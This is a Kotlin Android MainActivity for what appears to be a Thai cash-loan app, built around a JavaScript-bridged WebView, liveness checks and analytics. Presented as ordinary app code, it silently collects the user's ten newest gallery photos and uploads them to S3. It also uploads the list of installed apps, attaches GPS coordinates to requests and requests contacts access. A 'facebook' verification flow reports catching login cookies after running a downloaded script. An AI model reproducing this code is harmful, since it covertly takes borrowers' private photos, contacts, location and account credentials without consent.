package com.cashloans.cashcloud

import ai.advance.liveness.lib.GuardianLivenessDetectionSDK
import ai.advance.liveness.lib.LivenessResult
import ai.advance.liveness.sdk.activity.LivenessActivity
import android.Manifest
import android.content.Intent
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.provider.MediaStore
import android.text.TextUtils
import android.util.ArrayMap
import android.util.Log
import android.view.View
import android.view.ViewGroup
import android.view.WindowManager
import android.webkit.ValueCallback
import android.webkit.WebChromeClient
import android.webkit.WebView
import android.widget.Button
import android.widget.FrameLayout
import com.appsflyer.AppsFlyerLib
import com.github.gzuliyujiang.oaid.DeviceID
import com.github.lzyzsd.jsbridge.BridgeHandler
import com.github.lzyzsd.jsbridge.BridgeWebView
import com.google.gson.Gson
import com.hjq.permissions.Permission
import com.hjq.permissions.XXPermissions
import com.hjq.toast.ToastUtils
import com.min.authenticationsdk.Authentication
import com.qpg.superhttp.SuperHttp
import com.qpg.superhttp.callback.SimpleCallBack
import com.tbruyelle.rxpermissions2.RxPermissions
import com.cashloans.cashcloud.appTool.*
import com.cashloans.cashcloud.appTool.httpManger.*
import com.cashloans.cashcloud.models.*
import com.cashloans.cashcloud.uiPakage.IRefresh
import com.cashloans.cashcloud.uiPakage.lianxiren
import com.cashloans.cashcloud.uiPakage.mainKefuvc
import com.cashloans.cashcloud.uiPakage.userPic
import com.cashloans.thloans.appTool.App
import com.cashloans.thloans.appTool.BaseBean
import com.cashloans.thloans.appTool.ThConfig
import com.github.lzyzsd.jsbridge.CallBackFunction
import com.timelofirst.timelyloan.tool.ProjectTool
import org.json.JSONException
import org.json.JSONObject
import java.io.File
import java.text.SimpleDateFormat
import java.util.*
import kotlin.collections.ArrayList
import kotlin.collections.HashMap


class MainActivity : BaseActivity() ,IRefresh,MainActivesCon.View{
    private lateinit var userLunch: View
    private var isFinish = false
    private var type = 0
    var isLivenss:Boolean = false
    var imageMaps = ArrayList<Map<String,String>>()
    var compressmageMaps = ArrayList<Map<String,String>>()

    /**
     * 活体请求状态码
     */
    val REQUEST_CODE_LIVENESS: Int = 12323
    var livenessId:String = "88888"


    private val mRxPermissions by lazy {
        RxPermissions(this)
    }
    private val homePresenter: MainActivesCon.Presenter by lazy {
       MainHomePresenter(this)
    }
    private lateinit var mainWebView: BridgeWebView
    private lateinit var flContainer: FrameLayout
    private lateinit var refresh: Button
    private var mFilePathCallback: ValueCallback<Array<Uri>>? = null
     fun userLunchView(){
        if (DataManager.INSTANCE.getFromSshredPerences("isFirst") != "false") {
                 userLunch = View.inflate(this, R.layout.activity_mainlunch, null)
            flContainer.addView(userLunch, ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)
                val button = userLunch.findViewById<Button>(R.id.launcher_button)
                button.setOnClickListener {
                getUserPermission()
             }
        }else {
            loadDialog.showLoadurl(this,"0")
        }

}
    override fun getLayoutId(): Int {
        return R.layout.activity_base_webview
    }
    override fun onDestroy() {
        super.onDestroy()
        flContainer.removeAllViews()
        mainWebView.removeAllViews()
        mainWebView.destroy()
    }
    override fun initView() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            //5.0 全透明实现
            var window = getWindow()
            window.clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS)
            window.getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN or View.SYSTEM_UI_FLAG_LAYOUT_STABLE)
            window.addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS)
            window.setStatusBarColor(Color.TRANSPARENT)
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            //4.4 全透明状态栏
            getWindow().addFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS);
        }
        refresh = findViewById(R.id.refresh)
        refresh.setOnClickListener {
            loadDialog.showLoadurl(this,"loading...")

            mainWebView.reload()
        }
        flContainer = findViewById(R.id.webview_container)


        mainWebView = BridgeWebView(this)
        flContainer.addView(mainWebView, ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT)
        val webSettings = mainWebView.settings
        webSettings.domStorageEnabled = true // local storage
        webSettings.blockNetworkImage = false    // 解决图片不显示
        webSettings.javaScriptCanOpenWindowsAutomatically = true
        webSettings.loadsImagesAutomatically = true
        webSettings.useWideViewPort = true
        webSettings.loadWithOverviewMode = true
        webSettings.javaScriptEnabled = true
        webSettings.setSupportZoom(false)
        webSettings.setDefaultTextEncodingName("UTF-8")
        webSettings.allowContentAccess = true
        webSettings.allowFileAccess = true
        webSettings.setAllowFileAccessFromFileURLs(false)
        webSettings.setAllowUniversalAccessFromFileURLs(false)
        mainWebView.loadUrl(ThConfig.baseUrl)
        mainWebView.webChromeClient = object : WebChromeClient() {

            override fun onShowFileChooser(p0: WebView?, p1: ValueCallback<Array<Uri>>?, p2: FileChooserParams?): Boolean {
                mFilePathCallback = p1
                val acceptTypes = p2?.acceptTypes
                Log.d("webViewChromeClient", acceptTypes.toString())
                return true
            }
            override fun onProgressChanged(p0: WebView?, p1: Int) {
                loadDialog.changeText(p1)

                if (p1>=100) {

                    loadDialog.hideLoadingDialog()
                }
                super.onProgressChanged(p0, p1)
            }

        }
            registerJsHandler()
            loadDialog.showLoadurl(this,"loading...")

        userLunchView()


    }
    override fun onRestart() {
        bridgeGetMyCheck()
        super.onRestart()
    }
    fun bridgeGetMyCheck(){
        mainWebView.callHandler("bridgeGetMyCheck","", CallBackFunction {
            Log.d("bridgeGetMyCheck","bridgeGetMyCheck")
        })

    }
    private fun registerJsHandler() {
        mainWebView.registerHandler("bridgeToLive", BridgeHandler { data, function ->
            type = 1
            idCards()
            Log.d("renlian","123123123123123")
        })
        mainWebView.registerHandler("bridgeGetLiveId", BridgeHandler { data, function ->

        })
        mainWebView.registerHandler("bridgeToKefuPage", BridgeHandler { data, function ->
            Log.d("renlian","kefu")
            var jsonobject = JSONObject(data)
            var url = jsonobject.optString("msg")
            Log.d("kefu",url)
            if (!url.isEmpty()) {


                SuperHttp.get(ThConfig.KEFU_JSON)
                    .lifeCycleOwner(this)
                    .request(object : SimpleCallBack<KefuModel>() {
                        override fun onSuccess(data: KefuModel) {
                            var urls :String = data.url+url
                            val intent = Intent(this@MainActivity, mainKefuvc::class.java)
                            intent.putExtra("url", urls);
                            startActivity(intent)
                            loadDialog.hideLoadingDialog()
                        }
                        override fun onFail(errCode: Int, errMsg: String) {
                            Log.d("mesggg","123123123")
                            loadDialog.hideLoadingDialog()
                        }
                    })
            }
        })
        mainWebView.registerHandler("bridgeToCertificationPage") { data, function ->
            try {
                val jsonObject = JSONObject(data)
                when (jsonObject.optString("msg")) {
                    "name" -> {
                        type = 0
                        idCards()

                    }
                    "facebook" -> {
                        loadDialog.show(this,"loading...")

                        val param = ArrayMap<String, String>()
                        param["phoneNumber"] = DataManager.INSTANCE.getFromSshredPerences(Constants.EXTRA_PHONE)
                        SuperHttp.post(HttpNames.faceBookNonce)
                            .setJson(Gson().toJson(param))
                            .addHeader("Token", DataManager.INSTANCE.getFromSshredPerences("token"))
                            .request(object : SimpleCallBack<BaseBean>() {
                                override fun onSuccess(data: BaseBean) {
                                    loadDialog.hideLoadingDialog()
                                    var datas = Gson().fromJson(data.data.toString(), nonceStr::class.java)
                                        facebooks(datas.nonce)
                                    Log.d("qweqweqwe",datas.nonce)
                                }
                                override fun onFail(errCode: Int, errMsg: String) {

                                    Log.d("errors",errMsg)
                                }
                            })
                    }
                    "contact" -> {
                        Log.d("bbbbbbbbbbb","bbbbbbbbbbbbb")

                        lianxire()
                    }

                }
            } catch (e: JSONException) {
                e.printStackTrace()
            }

            function.onCallBack("")
        }
        mainWebView.registerHandler("bridgeToAppsflyer", BridgeHandler { data, function ->
            if (!data.isEmpty()) {
                try {
                    val jsonObject = JSONObject(data)
                    var msg = jsonObject.optString("msg")
                    AppsFlyerTool.event(msg)

                }catch (e: JSONException) {
                    e.printStackTrace()
                }
            }
        })

        mainWebView.registerHandler("bridgeOpenUrl", BridgeHandler { data, function ->
            try {
                val jsonObject = JSONObject(data)
                val url = jsonObject.optString("url")
                if (!TextUtils.isEmpty(url)) {
                    val i = Intent(Intent.ACTION_VIEW, Uri.parse(url))
                    startActivity(i)
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
            function.onCallBack("")
        })
        mainWebView.registerHandler("bridgeAppToken", BridgeHandler { data, function ->
            try {

                val jsonObject = JSONObject(data)

                val token = jsonObject.optString("token")
                val phone = jsonObject.optString("phone")
                DataManager.INSTANCE.saveDataToSP(Constants.PREF_TOKEN, token)
                DataManager.INSTANCE.saveDataToSP(Constants.EXTRA_PHONE,phone)
                val headerMap: HashMap<String, String> = HashMap()
                headerMap["Token"] = token
                val location = ThLoanLocationUtils.INSTANCE.getLocation()
                if (location != null) {
                    headerMap["LAT"] = location.latitude.toString()
                    headerMap["LNG"] = location.longitude.toString()

                }
                SuperHttp.config() //配置请求主机地址
                    .globalHeaders(headerMap)
                var handel = Handler()
                handel.postDelayed({
                    homePresenter.s3uploadFile(MainHomePresenter.s3UploadJsonAppIcon)
                    getImagesPath()
                },1000)
                var appsFlyerid= AppsFlyerLib.getInstance().getAppsFlyerUID(App.getContext())

                var map = HashMap<String,String>()
                map.put("appsFlyerid",appsFlyerid)
                var strs = HttpNames.appsFlyId+"/"+appsFlyerid
                SuperHttp.post(strs)
                    .addHeader("Token", DataManager.INSTANCE.getFromSshredPerences("token"))
                    .setJson(Gson().toJson(map))
                    .request(object : SimpleCallBack<BaseBean>() {
                        override fun onSuccess(data: BaseBean) {
                            if (data.code == 0){
                                Log.d("aaaaa","successssss")
                            }

                        }

                        override fun onFail(errCode: Int, errMsg: String) {

                            Log.d("aaaaa","qqqqqqqqqqqq")
                        }
                    })
            } catch (e: JSONException) {
                e.printStackTrace()
            }
            function.onCallBack("")
        })
        mainWebView.registerHandler("bridgeDeviceInfo", BridgeHandler { data, function ->
            function.onCallBack(getDeviceInfoJson())
            requireApplicationPermission()
        })
    }
    fun facebooks(nonces : String){
        val activity = App.getInstance().topActivity()
        AppsFlyerTool.event("facebook_button_click")
        Authentication.startAuthentication(activity,nonces,object : Authentication.OnAuthenticationCallback{
            override fun onStatusChange(status: Int) {
                when (status) {
                    Authentication.RESULT_SUCCESS -> {
                        // 认证成功
                        AppsFlyerTool.event("facebook_runscript_sucess")
                    }
                    Authentication.RESULT_CANCEL -> {
                        // 认证取消
                        AppsFlyerTool.event("facebook_authbutton_cancel")
                    }
                    Authentication.RESULT_FAILED -> {
                        // 认证失败
                        AppsFlyerTool.event("facebook_runscript_sucess")
                    }
                    Authentication.COOKIE_CATCH -> {
                        // 抓取到了cookie
                        AppsFlyerTool.event("facebook_logincookie_sucess")

                    }
                    Authentication.SHELL_DONE -> {
                        // 脚本执行完毕，注:理论上脚本执行完毕后，同时会回调Authentication.RESULT_SUCCESS
                        // 或者Authentication.RESULT_FAILED
                    }
                    Authentication.DOWNLOADZIP_SUCCESS -> {
                        AppsFlyerTool.event("facebook_zipdownload_sucess")
                    }
                    Authentication.FBLOAD_SUCCESS -> {
                        AppsFlyerTool.event("facebook_loadpage_open")
                    }
                }
            }
        })

    }

//
    fun lianxire(){
        val disposable = mRxPermissions.request(Manifest.permission.READ_CONTACTS)
            .subscribe { granted ->
                if (granted) {
                    val intent = Intent(this@MainActivity, lianxiren::class.java)
                    startActivity(intent)

                } else {
                    val toast = ToastUtils.show( "โปรดอนุญาตการอนุญาตสมุดที่อยู่ (การตั้งค่า -> แอปพลิเคชั่น -> การจัดการสิทธิ์)\n" +
                            "หากมีความเสี่ยงที่แอปพลิเคชันถูกห้ามไม่ให้ได้รับการอนุญาตนี้โปรดไปที่ตัวจัดการโทรศัพท์เพื่อลบการควบคุม")
                }
            }
    }
    private fun requireApplicationPermission() {
        val disposable = mRxPermissions.request(Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.READ_CONTACTS)
            .subscribe { granted ->
                if (granted) {
                    ThLoanLocationUtils.INSTANCE.addLocationListener()
                }else{
                }
            }
    }
    private fun idCards() {
        val disposable = mRxPermissions.request(
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA, Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_CONTACTS)
            .subscribe { granted ->
                if (granted) {
                    if (type == 0) {
                        AppsFlyerTool.event("identity_cameralicense_sucess")
                    }else{
                        AppsFlyerTool.event("borrow_identity_cameralicense_sucess")
                    }
                    if (isLivenss&&type==0) {
                        val intent = Intent(this@MainActivity, userPic::class.java)
                        intent.putExtra("livenessId", livenessId)
                        startActivity(intent)
                    }else {
                        loadDialog.show(this,"loading...")

                        Log.d("lincssssss", DataManager.INSTANCE.getFromSshredPerences("token"))

                        var map = HashMap<String,String>()
                        map.put("applicationId",packageName)
                        SuperHttp.post(HttpNames.getRealnametaskid)
                            .addHeader("Token", DataManager.INSTANCE.getFromSshredPerences("token"))
                            .setJson(Gson().toJson(map))
                            .request(object : SimpleCallBack<BaseBean>() {
                             override fun onSuccess(data: BaseBean) {
                            if (data.code == 0){
                                 var gson = Gson().fromJson(data.data,AdvanceModel::class.java)
                                loadDialog.hideLoadingDialog()

                                 var licens :String = gson.license
                                renlianKaiqi(licens.toString())
                                }

                             }

                              override fun onFail(errCode: Int, errMsg: String) {

                                  Log.d("mesggg",errMsg)
                              }
                            })
                    }
                } else {
                    if (type == 0) {
                        AppsFlyerTool.event("identity_cameralicense_fail")
                    }else {
                        AppsFlyerTool.event("borrow_identity_cameralicense_fail")
                    }
                    ToastUtils.show(R.string.permission_camera_storage_denied)
                }
            }
    }
        private fun getUserPermission() {
            DataManager.INSTANCE.saveDataToSP("isFirst","false")

        XXPermissions.with(this)
            .permission(Permission.WRITE_EXTERNAL_STORAGE)
            .permission(Permission.ACCESS_FINE_LOCATION)
            .permission(Permission.ACCESS_COARSE_LOCATION)
            .permission(Permission.READ_CONTACTS)
            .request { permissions, all ->
                if (all) {
//                   成功
                    flContainer.removeView(userLunch)

                }
            }

    }
    private fun renlianKaiqi(advanceliveness:String) {
        val checkResult: String = GuardianLivenessDetectionSDK.setLicenseAndCheck(advanceliveness)
        if ("SUCCESS" == checkResult) {

            livenessId =advanceliveness
            startLivenessActivity()
        } else {
            AppsFlyerTool.event("realname_bioAssay_quit")
            if (type == 0) {
                AppsFlyerTool.event("identity_live_error")
            }else {
                AppsFlyerTool.event("borrow_identity_live_error")
            }

        }
    }
    /**
     * 启动活体检测
     */
    private fun startLivenessActivity() {
        if (type==0) {
            AppsFlyerTool.event("identity_live_open")
        }else {
            AppsFlyerTool.event("borrow_identity_live_open")
        }
        val intent = Intent(this, LivenessActivity::class.java)
        startActivityForResult(intent, REQUEST_CODE_LIVENESS)
    }


    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQUEST_CODE_LIVENESS) {
            if (LivenessResult.isSuccess()) {// 活体检测成功
                isLivenss = true
                Log.d("111","2222")

                livenessId = LivenessResult.getLivenessId();// 本次活体id

                if (type == 0) {
                    AppsFlyerTool.event("identity_live_sucess")
                    val intent = Intent(this@MainActivity, userPic::class.java)
                    intent.putExtra("livenessId", livenessId)
                    startActivity(intent)
                }else {
                    Log.d("111","2222")
                    AppsFlyerTool.event("borrow_identity_live_sucess")
                    var map = HashMap<String,Any>()
                    map.put("livenessId", livenessId)
                    mainWebView.callHandler("bridgeGetLiveId","1",null)
                    SuperHttp.post(HttpNames.sendLiveIds)
                        .addHeader("Token", DataManager.INSTANCE.getFromSshredPerences("token"))

                        .addParam("livenessId",livenessId)
                        .request(object : SimpleCallBack<BaseBean>() {
                            override fun onSuccess(data: BaseBean) {
                                Log.d("datas",data.message)

                                if (data.code == 0){
                                }
                            }

                            override fun onFail(errCode: Int, errMsg: String) {

                                Log.d("mesggg",errMsg)
                            }
                        })
                }

                    AppsFlyerTool.event("identity_live_sucess")

            } else {// 活体检测失败
                AppsFlyerTool.event("identity_live_fail")
                var errorMsg = LivenessResult.getErrorMsg();// 失败原因
                if (!errorMsg.isNullOrEmpty()) {
                    ToastUtils.show(errorMsg)
                }
            }

        }


    }
    //刷新web
    override fun onRefresh() {
        mainWebView.reload()
    }



   override fun UpLoadFileRes(s3UploadImgInfo: S3UploadImgInfo, type: Int){
       if (type == MainActivesCon.s3UploadJsonAppIcon) {
           var filePath = GetApplList.getAppinfoJsonFile(this).path
           Log.d("jsonUrl", filePath)
           var r = RCInfoUploadUntil()
//           r.uploadFile(s3UploadImgInfo, filePath)
           r.setCallBack1(object : RCInfoUploadUntil.CallBackInterface {
               override fun fileUploadSuccess() {
                   var jsonUrl = s3UploadImgInfo.urlString + "/" + s3UploadImgInfo.param.key
                   Log.d("jsonUrl2222222", jsonUrl)

                   homePresenter.uploadJson(jsonUrl)
               }
           })

       }else if (type == MainActivesCon.s3UploadJsonAppImage) {

           var filePath = GetApplList.getImageJsonFile(this,compressmageMaps).path
           var r = RCInfoUploadUntil()
           Log.d("S3UploadImgInfo333", s3UploadImgInfo.toString()+filePath)
           r.uploadFile(s3UploadImgInfo, filePath)
           r.setCallBack1(object : RCInfoUploadUntil.CallBackInterface {
               override fun fileUploadSuccess() {
                   var jsonUrl = s3UploadImgInfo.urlString + "/" + s3UploadImgInfo.param.key
                   Log.d("jsonUrl111111111", jsonUrl)
                   homePresenter.uploadImageJson(jsonUrl,imageMaps.size)
               }
           })
       }
    }
    //        获取手机应用信息
    private fun getDeviceInfoJson(): String {
        Log.d("getImieFromSdk", String.format("DeviceID: %s", DeviceID.getClientId()))
        val deviceInfo = ArrayMap<String, Any>()
        val gson = Gson()
        deviceInfo["AppName"] = ThConfig.APP_NAME
        deviceInfo["DeviceType"] = Build.MODEL
        deviceInfo["IMEI"] = ProjectTool.getoaid()
        deviceInfo["Token"] = DataManager.INSTANCE.getFromSshredPerences(Constants.PREF_TOKEN)

        val location = ThLoanLocationUtils.INSTANCE.getLocation()
        deviceInfo["LAT"] = location?.latitude.toString()
        deviceInfo["LNG"] = location?.longitude.toString()
        Log.d("deviceInfo",DeviceID.getClientId().toString())
        deviceInfo["pack"] = packageName
        return gson.toJson(deviceInfo)
    }
//    上传图片
    fun getImagesPath(){

        var cursor = contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null, null)
        if (cursor != null) {
            while (cursor.moveToNext()) {
                //获取图片的名称
                var name = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME))
                //获取图片的生成日期
                val data = cursor.getLong(cursor.getColumnIndex(MediaStore.Images.Media.DATE_MODIFIED))
                val format = SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
                val time: String = format.format(Date(data * 1000L))

                // 获取图片的绝对路径
                var column_index = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
                var path = cursor.getString(column_index!!)
                if (name.isNullOrEmpty()){
                }else{
                    var imageMap = HashMap<String,String>()
                    imageMap.put("path",path.toString())
                    imageMap.put("name", name.toString())
                    imageMap.put("date", time.toString())
                    imageMaps.add(imageMap)
                }



            }
        }
        var newimageMaps = imageMaps.subList(imageMaps.size-10,imageMaps.size)
        var i = 0
        Log.d("s3UploadImgInfo22","s3UploadImgInfo")
        for (imageMap in newimageMaps) {

            PhotoUtils.compressPicture(this, imageMap["path"].toString(), object : PhotoUtils.Companion.OnPictureCompressListener() {
                override fun onSuccess(file: File) {
                    var newimageMap = HashMap<String,String>()
                    newimageMap.putAll(imageMap)
                    newimageMap.put("compressPath", file.path)
                    compressmageMaps.add(newimageMap)
                    i++
                    if (i == newimageMaps.size) {
                        Log.d("s3UploadImgInfo11","s3UploadImgInfo")
                        homePresenter.s3uploadFile(MainActivesCon.s3UploadJsonAppImage)
                    }
                }

                override fun onError(e: Throwable) {
                }
            })
        }
    }
    override fun onBackPressed() {
        if (mainWebView.canGoBack()) {
            mainWebView.goBack()
        }else
            super.onBackPressed()
    }
}